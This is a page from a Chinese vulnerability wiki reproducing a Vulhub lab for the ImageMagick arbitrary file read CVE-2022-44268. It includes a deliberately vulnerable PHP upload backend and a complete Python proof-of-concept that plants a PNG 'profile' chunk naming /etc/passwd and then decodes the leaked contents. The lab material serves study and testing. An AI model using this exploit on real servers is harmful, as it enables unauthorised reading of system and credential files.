<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2022-44268/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>ImageMagick任意文件读取漏洞 CVE-2022-44268 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "ImageMagick\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2022-44268", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u9644\u5f55", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JD-FreeFuck 后台命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2016%E2%80%933714/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2016%E2%80%933714/" class="btn btn-xs btn-link">
        Imagemagick 命令执行漏洞 CVE-2016–3714
      </a>
    </div>
    
  </div>

    

    <h1 id="imagemagick-cve-2022-44268">ImageMagick任意文件读取漏洞 CVE-2022-44268<a class="headerlink" href="#imagemagick-cve-2022-44268" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。</p>
<p>在ImageMagick 7.1.0-51版本及以前，其处理PNG文件的代码中存在一处功能，会导致转换图片时读取到当前操作系统上的任意文件，并将文件内容输出在图片内容中。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.metabaseq.com/imagemagick-zero-days/">https://www.metabaseq.com/imagemagick-zero-days/</a></li>
<li><a href="https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06">https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Vulhub执行如下命令启动一个Web服务器，这个服务器的功能是将用户上传的任意图片缩小成50x50的PNG图片。</p>
<div class="highlight"><pre><span></span><code>docker-compose up -d
</code></pre></div>
<p>服务启动后，访问<code>http://your-ip:8080</code>可以看到图片上传框：</p>
<p><img alt="image-20230206091512388" src="../images/image-20230206091512388.png" /></p>
<p><a href="#后端服务代码">后端服务</a>的代码十分简单：</p>
<div class="highlight"><pre><span></span><code>$newname = uniqid() . &#39;.png&#39;;
shell_exec(&quot;convert -resize 50x50 {$_FILES[&#39;file_upload&#39;][&#39;tmp_name&#39;]} ./{$newname}&quot;);
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>利用这个漏洞，需要先准备一个恶意PNG文件，文件内容中包含我们准备读取的文件路径：</p>
<p>可以使用<a href="#poc.py">poc.py</a>来生成这个图片：</p>
<div class="highlight"><pre><span></span><code>python poc.py generate -i input.png -o poc.png -r /etc/passwd
</code></pre></div>
<blockquote>
<p>执行poc.py前请安装<a href="https://pypng.readthedocs.io/en/latest/">PyPNG</a>：<code>pip install pypng</code></p>
</blockquote>
<p>如果你使用<a href="https://en.wikipedia.org/wiki/010_Editor">010editor</a>查看这个图片，可以看到其中包含一个类型是<code>tEXt</code>的chunk，其中包含我们的Payload <code>profile=/etc/passwd</code>：</p>
<p><img alt="image-20230206092153724" src="../images/image-20230206092153724-16788460993989.png" /></p>
<p>接着，我们将这个图片上传到目标服务中：</p>
<p><img alt="image-20230206092252429" src="../images/image-20230206092252429-167884610230611.png" /></p>
<p>下载服务处理后生成的图片，使用<a href="#poc.py">poc.py</a>提取出其中所有内容：</p>
<div class="highlight"><pre><span></span><code>python poc.py parse -i output.png
</code></pre></div>
<p><img alt="image-20230206092642268" src="../images/image-20230206092642268-167884610412013.png" /></p>
<p>可以看到，已经提取出<code>/etc/passwd</code>文件的内容，这部分内容是由ImageMagick在处理旧图片时读取并写入到新图片中。</p>
<h2 id="_4">附录<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<h3 id="_5">后端服务代码<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>&lt;?php
$newname = &#39;&#39;;
if (!empty($_FILES)) {
    $ext = pathinfo($_FILES[&#39;file_upload&#39;][&#39;name&#39;], PATHINFO_EXTENSION);
    if (!in_array($ext, [&#39;gif&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;jpeg&#39;])) {
        die(&#39;Unsupported filetype uploaded.&#39;);
    }

    $newname = uniqid() . &#39;.png&#39;;
    shell_exec(&quot;convert -resize 50x50 {$_FILES[&#39;file_upload&#39;][&#39;tmp_name&#39;]} ./{$newname}&quot;);
}
?&gt;
&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;
    &lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;br&gt;
&lt;?php
if ($newname):
?&gt;
&lt;h1&gt;Your image:&lt;/h1&gt;
&lt;p&gt;
    &lt;a href=&quot;./&lt;?=$newname?&gt;&quot; target=&quot;_blank&quot;&gt;
        &lt;img src=&quot;./&lt;?=$newname?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot;&gt;
    &lt;/a&gt;
&lt;/p&gt;
&lt;?php
endif;
</code></pre></div>
<h3 id="pocpy">poc.py<a class="headerlink" href="#pocpy" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>#!/usr/bin/env python3
import sys
import png
import zlib
import argparse
import binascii
import logging

logging.basicConfig(stream=sys.stderr, level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
d = zlib.decompressobj()
e = zlib.compressobj()
IHDR = b&#39;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#39;
IDAT = b&#39;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#39; \
       b&#39;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#39; \
       b&#39;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#39;


def parse_data(data: bytes) -&gt; str:
    _, data = data.strip().split(b&#39;\n&#39;, 1)
    return binascii.unhexlify(data.replace(b&#39;\n&#39;, b&#39;&#39;)).decode()


def read(filename: str):
    if not filename:
        logging.error(&#39;you must specify a input filename&#39;)
        return

    res = &#39;&#39;
    p = png.Reader(filename=filename)
    for k, v in p.chunks():
        logging.info(&quot;chunk %s found, value = %r&quot;, k.decode(), v)
        if k == b&#39;zTXt&#39;:
            name, data = v.split(b&#39;\x00&#39;, 1)
            res = parse_data(d.decompress(data[1:]))

    if res:
        sys.stdout.write(res)
        sys.stdout.flush()


def write(from_filename, to_filename, read_filename):
    if not to_filename:
        logging.error(&#39;you must specify a output filename&#39;)
        return

    with open(to_filename, &#39;wb&#39;) as f:
        f.write(png.signature)
        if from_filename:
            p = png.Reader(filename=from_filename)
            for k, v in p.chunks():
                if k != b&#39;IEND&#39;:
                    png.write_chunk(f, k, v)
        else:
            png.write_chunk(f, b&#39;IHDR&#39;, IHDR)
            png.write_chunk(f, b&#39;IDAT&#39;, IDAT)

        png.write_chunk(f, b&quot;tEXt&quot;, b&quot;profile\x00&quot; + read_filename.encode())
        png.write_chunk(f, b&#39;IEND&#39;, b&#39;&#39;)


def main():
    parser = argparse.ArgumentParser(description=&#39;POC for CVE-2022-44268&#39;)
    parser.add_argument(&#39;action&#39;, type=str, choices=(&#39;generate&#39;, &#39;parse&#39;))
    parser.add_argument(&#39;-i&#39;, &#39;--input&#39;, type=str, help=&#39;input filename&#39;)
    parser.add_argument(&#39;-o&#39;, &#39;--output&#39;, type=str, help=&#39;output filename&#39;)
    parser.add_argument(&#39;-r&#39;, &#39;--read&#39;, type=str, help=&#39;target file to read&#39;, default=&#39;/etc/passwd&#39;)
    args = parser.parse_args()
    if args.action == &#39;generate&#39;:
        write(args.input, args.output, args.read)
    elif args.action == &#39;parse&#39;:
        read(args.input)
    else:
        logging.error(&quot;bad action&quot;)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JD-FreeFuck 后台命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2016%E2%80%933714/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../ImageMagick%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2016%E2%80%933714/" class="btn btn-xs btn-link">
        Imagemagick 命令执行漏洞 CVE-2016–3714
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>